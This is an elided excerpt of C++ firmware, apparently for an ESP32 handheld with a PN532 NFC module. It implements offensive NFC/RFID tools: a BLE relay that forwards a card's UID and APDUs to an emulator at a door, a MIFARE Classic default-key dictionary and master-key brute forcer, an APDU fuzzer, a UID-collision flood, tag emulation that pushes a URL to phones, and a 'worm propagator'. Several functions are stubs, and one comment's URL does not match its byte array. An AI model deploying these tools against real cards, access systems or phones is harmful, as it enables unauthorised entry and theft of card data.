...
static void setupRelayBLE(bool isServer) {
  ...
  if (isServer) {
    ...
    relayService =
        relayServer->createService("0000aaaa-0000-1000-8000-00805f9b34fb");
    relayTx = relayService->createCharacteristic(
        "0000aaab-0000-1000-8000-00805f9b34fb", NIMBLE_PROPERTY::NOTIFY);
    relayRx = relayService->createCharacteristic(
  ...
  std::vector<Option> options = {
       ...
       []() {
         ...
         while (1) {
           ...
           if (relayBleConnected) {
             ...
             uint8_t uidLength;
             if (nfcModule->nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid,
                                                    &uidLength, 500)) {
               // Forward UID
               ...
               if (!relayRxBuffer.empty()) {
                 ...
                 if (nfcModule->nfc.inDataExchange(relayRxBuffer.data(),
                                                   relayRxBuffer.size(),
      ...
      {"2. Modo Emulador (Porta)",
       []() {
         ...
         printSubtitle("Aguardando BLE...");
         setupRelayBLE(
             false); // Should implement client BLE to connect to server
         ...
         while (1) {
           ...
           int16_t rxLen =
               nfcModule->nfc.TgGetData(rxBuffer, &rxLen_val) ? rxLen_val : 0;
           if (rxLen > 0) {
...
void APDUCommandFuzzer() {
  ...
  if (found) {
    ...
    while (1) {
      ...
      // Update UI
      if (fuzzedCount % 10 == 0) {
        tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20,
                     willyConfig.bgColor);
...
void DynamicUIDCollision() {
  ...
  // We can emulate multiple targets rapidly by dynamically changing the
  // emulated UID.
  while (1) {
    if (check(EscPress))
      break;
    ...
    (void)uid; // Used conceptually for anti-collision flood
...
void NDEFStealthExfil() {
  ...
  padprintln("Payload: https://willy.local/x");
  ...
  // NDEF Message: 0xD1 0x01 0x0D 0x55 0x04 'willy.local/x'
  uint8_t ndefPayload[] = {0xD1, 0x01, 0x0D, 0x55, 0x04, 'b', 'r', 'u', 'c',
                           'e',  '.',  'l',  'o',  'c',  'a', 'l', '/', 'x'};

  (void)ndefPayload; // Payload for future T4T emulation
    ...
    if (nfcModule->nfc.TgInitAsTarget()) {
      ...
      while (1) {
        ...
        if (rxLen > 0) {
          ...
          // The phone sends Select Applet, Select CC, ReadBinary CC, Select
          // NDEF, ReadBinary NDEF... A complete T4T stack would fully parse
          // rxBuf. This attack simulates answering the APDUs to inject the NDEF
          // Payload.
...
void MifareRainbowTable() {
  ...
  uint8_t rainbowTable[][6] = {{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
  ...
  if (found) {
    ...
    for (int i = 0; i < tableSize; i++) {
      ...
      tft.fillRect(10, tftHeight / 2, tftWidth - 20, 40, willyConfig.bgColor);
      tft.setCursor(10, tftHeight / 2);
      tft.print("Tentando: ");
      for (int k = 0; k < 6; k++) {
        if (rainbowTable[i][k] < 0x10)
          tft.print("0");
        tft.print(rainbowTable[i][k], HEX);
      }

      // Try to authenticate block 4 (Sector 1) with Key A
      if (nfcModule->nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 4, 0,
                                                         rainbowTable[i])) {
...
void LiveDataInjectionEmulation() {
  ...
  while (1) {
    ...
    if (nfcModule->nfc.TgInitAsTarget()) {
      ...
      uint8_t rxLen_val = (uint8_t)sizeof(rxBuf);
      int16_t rxLen =
          nfcModule->nfc.TgGetData(rxBuf, &rxLen_val) ? rxLen_val : 0;
      if (rxLen > 0) {
...
void RFIDSkimmerHunterPro() {
  ...
  while (1) {
    ...
    if (nfcModule->nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen,
                                           500)) {
      tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20,
                   willyConfig.bgColor);
      tft.setCursor(10, tftHeight / 2 + 20);
...
void NFCWormPropagator() {
  ...
  while (1) {
    ...
    // Simulated propagation: when target is initialized and interact with
    // reader
    if (nfcModule->nfc.TgInitAsTarget()) {
      tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20,
                   willyConfig.bgColor);
  ...
  while (1) {
    ...
    if (nfcModule->nfc.TgInitAsTarget()) {
      ...
      int16_t rxLen =
          nfcModule->nfc.TgGetData(rxBuf, &rxLen_val) ? rxLen_val : 0;
      if (rxLen > 0) {
        tft.fillRect(10, tftHeight / 2, tftWidth - 20, 20, willyConfig.bgColor);
        tft.setCursor(10, tftHeight / 2);
        tft.print("DATA CAPT:");
...
void MifareMasterKeyBrute() {
  ...
  while (1) {
    ...
    if (nfcModule->nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen,
      ...
      if (nfcModule->nfc.mifareclassic_AuthenticateBlock(uid, uidLen, 4, 0,
                                                         keys[currentKey])) {
